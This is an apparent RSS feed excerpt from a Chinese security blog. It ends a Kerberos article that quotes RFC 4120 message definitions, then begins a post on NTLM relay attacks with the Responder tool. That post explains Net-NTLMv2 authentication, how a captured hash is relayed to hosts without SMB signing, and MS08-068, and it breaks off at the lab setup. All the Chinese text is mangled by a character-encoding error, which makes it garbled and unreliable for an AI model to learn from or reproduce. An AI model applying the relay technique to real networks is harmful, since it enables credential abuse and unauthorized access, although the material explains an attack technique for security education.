&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Neuman, et al.              Standards Track                    [Page 85]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RFC 4120                      Kerberos V5                      July 2005
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   authenticator
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This contains the encrypted authenticator, which includes the
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      client&amp;#39;s choice of a subkey.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   The encrypted authenticator is included in the AP-REQ; it certifies
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   to a server that the sender has recent knowledge of the encryption
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   key in the accompanying ticket, to help the server detect replays.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   It also assists in the selection of a &amp;#34;true session key&amp;#34; to use with
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   the particular session.  The DER encoding of the following is
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   encrypted in the ticket&amp;#39;s session key, with a key usage value of 11
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   in normal application exchanges, or 7 when used as the PA-TGS-REQ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   PA-DATA field of a TGS-REQ exchange (see Section 5.4.1):
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   -- Unencrypted authenticator
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Authenticator   ::= [APPLICATION 2] SEQUENCE  {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           authenticator-vno       [0] INTEGER (5),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           crealm                  [1] Realm,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           cname                   [2] PrincipalName,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           cksum                   [3] Checksum OPTIONAL,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           cusec                   [4] Microseconds,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           ctime                   [5] KerberosTime,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           subkey                  [6] EncryptionKey OPTIONAL,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           seq-number              [7] UInt32 OPTIONAL,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           authorization-data      [8] AuthorizationData OPTIONAL
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   authenticator-vno
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field specifies the version number for the format of the
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      authenticator.  This document specifies version 5.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   crealm and cname
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      These fields are the same as those described for the ticket in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      section 5.3.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   cksum
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field contains a checksum of the application data that
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      accompanies the KRB_AP_REQ, computed using a key usage value of 10
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      in normal application exchanges, or 6 when used in the TGS-REQ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      PA-TGS-REQ AP-DATA field.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   cusec
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field contains the microsecond part of the client&amp;#39;s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      timestamp.  Its value (before encryption) ranges from 0 to 999999.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      It often appears along with ctime.  The two fields are used
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      together to specify a reasonably accurate timestamp.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ctime
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field contains the current time on the client&amp;#39;s host.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ¬é˜¶æ®µå¦‚å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/KRB_AP_REQ.png&#34; alt=&#34;KRB_AP_REQ&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ap_rep&#34;&gt;AP_REP&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;AP(Application Server)æ¥æ”¶åˆ°è¯·æ±‚åï¼Œç”¨è‡ªå·±çš„å¯†é’¥(Service Session Key)è§£å¯†TGSä¸­çš„&lt;code&gt;ticket-&amp;gt;enc-part&lt;/code&gt;è·å–&lt;code&gt;Service Session Key&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç„¶åä½¿ç”¨&lt;code&gt;Service Session Key&lt;/code&gt;è§£å¯†æ–°çš„Authenticationï¼Œå¯¹TGSå’Œauthenticatorè¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯é€šè¿‡åˆ™è¿”å›æ–°çš„æ—¶é—´æˆ³ï¼ˆé€šè¿‡Service Session Keyè¿›è¡ŒåŠ å¯†ï¼‰&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·é€šè¿‡&lt;code&gt;Service Session Key&lt;/code&gt;è§£å¯†AP-REPè¿”å›çš„æ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯å…¶æ˜¯å¦æ­£ç¡®ã€‚éªŒè¯é€šè¿‡åˆ™è¯æ˜å®¢æˆ·ç«¯å¯ä»¥ä¿¡èµ–æœåŠ¡å™¨ï¼Œå¹¶å‘æœåŠ¡å™¨APå‘é€æœåŠ¡è¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;æœåŠ¡å™¨ï¼ˆAPï¼‰å‘å®¢æˆ·ç«¯æä¾›ç›¸åº”çš„æœåŠ¡ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸‹é¢æ˜¯AP_REPçš„æ•°æ®åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/kerberos_authentication/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;rfcçš„æè¿°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5.5.2.  KRB_AP_REP Definition
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   The KRB_AP_REP message contains the Kerberos protocol version number,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   the message type, and an encrypted time-stamp.  The message is sent
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   in response to an application request (KRB_AP_REQ) for which the
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   mutual authentication option has been selected in the ap-options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   field.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   AP-REP          ::= [APPLICATION 15] SEQUENCE {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           pvno            [0] INTEGER (5),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           msg-type        [1] INTEGER (15),
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           enc-part        [2] EncryptedData -- EncAPRepPart
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EncAPRepPart    ::= [APPLICATION 27] SEQUENCE {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           ctime           [0] KerberosTime,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           cusec           [1] Microseconds,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           subkey          [2] EncryptionKey OPTIONAL,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           seq-number      [3] UInt32 OPTIONAL
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   The encoded EncAPRepPart is encrypted in the shared session key of
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   the ticket.  The optional subkey field can be used in an
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   application-arranged negotiation to choose a per association session
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   key.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   pvno and msg-type
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      These fields are described above in Section 5.4.1.  msg-type is
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      KRB_AP_REP.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   enc-part
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field is described above in Section 5.4.2.  It is computed
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      with a key usage value of 12.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ctime
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field contains the current time on the client&amp;#39;s host.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   cusec
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field contains the microsecond part of the client&amp;#39;s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      timestamp.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   subkey
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      This field contains an encryption key that is to be used to
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      protect this specific application session.  See Section 3.2.6 for
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      specifics on how this field is used to negotiate a key.  Unless an
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      application specifies otherwise, if this field is left out, the
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      sub-session key from the authenticator or if the latter is also
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      left out, the session key from the ticket will be used.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x03-å‚è€ƒ&#34;&gt;0x03 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.t00ls.cc/viewthread.php?tid=55987&#34;&gt;https://www.t00ls.cc/viewthread.php?tid=55987&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://buaq.net/go-87488.html&#34;&gt;https://buaq.net/go-87488.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.tarlogic.com/blog/how-kerberos-works/&#34;&gt;https://www.tarlogic.com/blog/how-kerberos-works/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8690&#34;&gt;https://xz.aliyun.com/t/8690&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://daiker.gitbook.io/windows-protocol/kerberos/&#34;&gt;https://daiker.gitbook.io/windows-protocol/kerberos/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.modb.pro/db/167245&#34;&gt;https://www.modb.pro/db/167245&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>ä½¿ç”¨Responderè¿›è¡ŒNTLMé‡æ”¾æ”»å‡»</title>
      <link>https://xxe.icu/responder_ntlmv2.html</link>
      <pubDate>Mon, 14 Feb 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/responder_ntlmv2.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-ç®€ä»‹&#34;&gt;0x00 ç®€ä»‹&lt;/h1&gt;
&lt;p&gt;åœ¨ä¹‹å‰æœ‰å†™è¿‡å…³äº&lt;a href=&#34;https://xxe.icu/posts/llmnr_nbt-ns/&#34;&gt;LLMNR/NBT-NSæ¬ºéª—æ”»å‡»&lt;/a&gt;çš„æ–‡ç« ï¼Œæœ¬æ–‡å†ä»ä¸­åšä¸€ä¸ªæ‰©å±•å»¶ä¼¸ï¼Œé‡Œé¢ç”¨åˆ°çš„æŠ€æœ¯å«åš&lt;strong&gt;NTLMé‡æ”¾æ”»å‡»&lt;/strong&gt;ã€‚å½“ç„¶ï¼Œè¿™ç§æ”»å‡»åˆ©ç”¨çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œä½¿ç”¨ResponderæŠ•æ¯’åªæ˜¯å…¶ä¸­çš„ä¸€ç§ï¼Œæ¯”å¦‚è¯´ç”¨ntlmrelayxæˆ–è€…msfé‡Œé¢çš„smb_relayæ¨¡å—ç­‰ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-åŸºç¡€çŸ¥è¯†&#34;&gt;0x01 åŸºç¡€çŸ¥è¯†&lt;/h1&gt;
&lt;h2 id=&#34;net-ntlmv2-è®¤è¯æµç¨‹&#34;&gt;Net-NTLM(v2) è®¤è¯æµç¨‹&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬è¦åˆ©ç”¨Net-NTLMå»åšé‡æ”¾ï¼Œè¦äº†è§£é‡Œé¢æ˜¯æ€ä¹ˆå»åšè®¤è¯çš„ã€‚æœ‰çš„å°ä¼™ä¼´çœ‹åˆ°è¿™ä¸ªå¾ˆç†Ÿæ‚‰ï¼Œè¿™ä¸ªä¸æ˜¯å¯ä»¥ç›´æ¥ç”¨æ¥pthæ¥å˜›ï¼Œä¸æ˜¯çš„ï¼Œèƒ½ç”¨æ¥åšpthæ”»å‡»çš„æ˜¯NTLM hashï¼ŒNet-NTLMåªèƒ½ç”¨æ¥åšé‡æ”¾æ”»å‡»ã€‚ä¸‹é¢æ˜¯è®¤è¯æµç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/NTLM_relay/1.jpeg&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ç™»å½•è¯·æ±‚ï¼Œå¯†ç åœ¨å®¢æˆ·ç«¯è¢« hash ä¸€æ¬¡&lt;/li&gt;
&lt;li&gt;å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ username&lt;/li&gt;
&lt;li&gt;æœåŠ¡å™¨è¿”å›ä¸€ä¸ª 16 å­—èŠ‚çš„æŒ‘æˆ˜ç ï¼ˆChallengeï¼‰ï¼Œå¹¶å°†å·²å­˜å‚¨çš„ç”¨æˆ·å¯†ç  hash åŠ å¯†è¿™ä¸ª Challengeï¼Œç”Ÿæˆ Challenge1&lt;/li&gt;
&lt;li&gt;å®¢æˆ·ç«¯å°†ç¬¬ä¸€æ­¥ hash çš„å¯†ç ä¸ Challenge å†è¿›è¡Œ hash ä¸€æ¬¡ï¼Œç”Ÿæˆ response å³ Challenge2&lt;/li&gt;
&lt;li&gt;å®¢æˆ·ç«¯å°† response å‘é€ç»™æœåŠ¡å™¨&lt;/li&gt;
&lt;li&gt;æœåŠ¡å™¨æ¯”è¾ƒ Challenge1 å’Œ responseï¼Œç›¸åŒåˆ™è®¤è¯æˆåŠŸ&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ntlmé‡æ”¾æ”»å‡»åŸç†&#34;&gt;NTLMé‡æ”¾æ”»å‡»åŸç†&lt;/h2&gt;
&lt;p&gt;äº†è§£äº† Net-NTLM è®¤è¯æµç¨‹ï¼Œå†æ¥åˆ†æ NTLMé‡æ”¾æ”»å‡»åŸç†å°±æ˜äº†å¤šäº†ï¼Œæ”»å‡»è€…å……å½“äº†ä¸€ä¸ªç¬¬ä¸‰äººï¼Œæˆªè·æµé‡ï¼Œé‡æ”¾æµé‡ï¼Œå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/NTLM_relay/2.jpeg&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¾®è½¯åœ¨MS08-068ä¸­å¯¹smb reflectåˆ°smbåšäº†é™åˆ¶ï¼Œé˜²æ­¢äº†åŒä¸€ä¸»æœºä»SMBåè®®å‘SMBåè®®çš„Net-NTLM-Hash Relayã€‚è¿™ä¸ªè¡¥ä¸åœ¨ CVE-2019-1384(Ghost Potato) è¢«ç»•è¿‡ã€‚&lt;/p&gt;
&lt;p&gt;è‡ªä» MS08-068 æ¼æ´ä¿®å¤ä¹‹åæ— æ³•å†å°† Net-NTLM å“ˆå¸Œå€¼ä¼ å›åˆ°å‘èµ·è¯·æ±‚çš„æœºå™¨ä¸Šï¼Œé™¤éè¿›è¡Œè·¨åè®®è½¬å‘ï¼Œä½†æ˜¯è¯¥å“ˆå¸Œå€¼ä»ç„¶å¯ä»¥é€šè¿‡ä¸­ç»§è½¬å‘ç»™å¦å¤–ä¸€å°æœºå™¨ã€‚åˆ©ç”¨Responderç»“åˆå…¶ä»–ä¸­ç»§å·¥å…·å¯ä»¥è¿›è¡Œè‡ªåŠ¨åŒ–çš„æ‹¦æˆªå¹¶ä¸”å¯¹å“ˆå¸Œå€¼è¿›è¡Œä¸­ç»§è½¬å‘ã€‚å”¯ä¸€çš„ä¸€ä¸ªä¸è¶³ä¹‹å¤„å°±æ˜¯ï¼Œåœ¨è¿™ä¹‹å‰éœ€è¦åœ¨&lt;strong&gt;è¿›è¡Œè½¬å‘æ“ä½œçš„æœºå™¨ä¸Šç¦ç”¨SMBç­¾å&lt;/strong&gt;ã€‚ä½†æ˜¯é™¤äº†ä¸ªåˆ«çš„ä¾‹å¤–ï¼Œæ‰€æœ‰çš„Windowsæ“ä½œç³»ç»Ÿéƒ½é»˜è®¤å…³é—­äº† SMBç­¾åã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è¯´äººè¯å°±æ˜¯&lt;/strong&gt;Aç™»é™†äº†administratorè¿™ä¸ªè´¦æˆ·ï¼Œæˆ‘ä»¬é€šè¿‡æ‰‹æ®µæ‹¿åˆ°Açš„Net-NTLM Hashåæ— æ³•ç›´æ¥æŠŠè¿™ä¸ªHashä¼ é€’å›Aï¼Œä½†æ˜¯å¦‚æœåŸŸå†…çš„Bä¹Ÿå¯ä»¥é€šè¿‡administratorè¿™ä¸ªè´¦æˆ·ç™»å½•ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æŠŠä»Aå¤„è·å¾—çš„Hashä¼ é€’ç»™Bï¼Œæ‹¿åˆ°Bå¤„çš„administratoræƒé™&lt;/p&gt;
&lt;p&gt;åœ¨å¼€å¯äº†SMB Signingçš„æƒ…å†µä¸‹ï¼Œåœ¨SMBåè®®åˆ©ç”¨NTLM SSPè¿›è¡Œäº†èº«ä»½éªŒè¯åï¼Œåç»­çš„æ‰€æœ‰æ•°æ®åŒ…ï¼Œéƒ½ä¼šåˆ©ç”¨NTLM SSPç”Ÿæˆçš„è¿™ä¸ªsession keyè¿›è¡Œç­¾åã€‚SMBæœåŠ¡ç«¯æ”¶åˆ°åç»­çš„æ•°æ®åŒ…åï¼Œä¹Ÿä¼šæ£€æŸ¥æ•°æ®åŒ…çš„ç­¾åï¼Œå¦‚æœç­¾åä¸å¯¹ï¼Œåˆ™æ‹’æ”¶ã€‚&lt;/p&gt;
&lt;p&gt;NTLM SSPåœ¨ç”Ÿæˆsession keyçš„æ—¶å€™ï¼Œä¼šéœ€è¦ç”¨åˆ°è´¦å·å¯†ç çš„åŸå§‹ LM HASH æˆ– NT HASHã€‚è€Œrelayå‹çš„æ”»å‡»ï¼Œéƒ½æ˜¯ç«™åœ¨ä¸€ä¸ªä¸­é—´äººçš„ä½ç½®ï¼Œæˆ‘ä»¬æ˜¯ä¸å¯èƒ½çŸ¥é“åŸå§‹ LM HASHæˆ–NT HASHçš„ï¼ˆå¦‚æœçŸ¥é“äº†ä¹Ÿå°±ä¸éœ€è¦ Relay è¿™ç§æ”»å‡»æ‰‹æ³•äº†ï¼‰ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•è®¡ç®—å‡ºæ¥è¿™ä¸ªsession keyçš„ï¼Œè‡ªç„¶ä¹Ÿå°±æ— æ³•å¯¹æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚&lt;/p&gt;
&lt;p&gt;SMBç­¾åæ˜¯ä¸€ç§æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯åå•†ä»¥ä½¿ç”¨ç»§æ‰¿çš„ä¼šè¯å¯†é’¥å¯¹æ‰€æœ‰ä¼ å…¥çš„æ•°æ®åŒ…è¿›è¡Œæ•°å­—ç­¾åçš„é…ç½®ã€‚è¿™æ ·çš„è¯ï¼Œå³ä½¿NTLMä¼šè¯è¿˜æ˜¯å¯èƒ½è¢«Relayï¼ŒæœåŠ¡å™¨ä¹Ÿä¸ä¼šè¢«åˆ©ç”¨ï¼Œå› ä¸ºæ”»å‡»è€…ç¼ºå°‘ä¼šè¯å¯†é’¥ã€‚åœ¨Active Directory ç½‘ç»œä¸­åªæœ‰åŸŸåæ§åˆ¶å™¨é»˜è®¤å¼€å¯SMBç­¾åï¼Œå…¶ä»–çš„æ‰€æœ‰æœåŠ¡å™¨æˆ–å·¥ä½œç»„é»˜è®¤ä¸å—ä¿æŠ¤ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x02-å®æˆ˜&#34;&gt;0x02 å®æˆ˜&lt;/h1&gt;
&lt;h2 id=&#34;å®éªŒç¯å¢ƒ&#34;&gt;å®éªŒç¯å¢ƒ&lt;/h2&gt;
&lt;p&gt;æœ¬æ¬¡çš„å®éªŒçš„ç¯å¢ƒå¦‚ä¸‹ï¼š&lt;/p&gt;
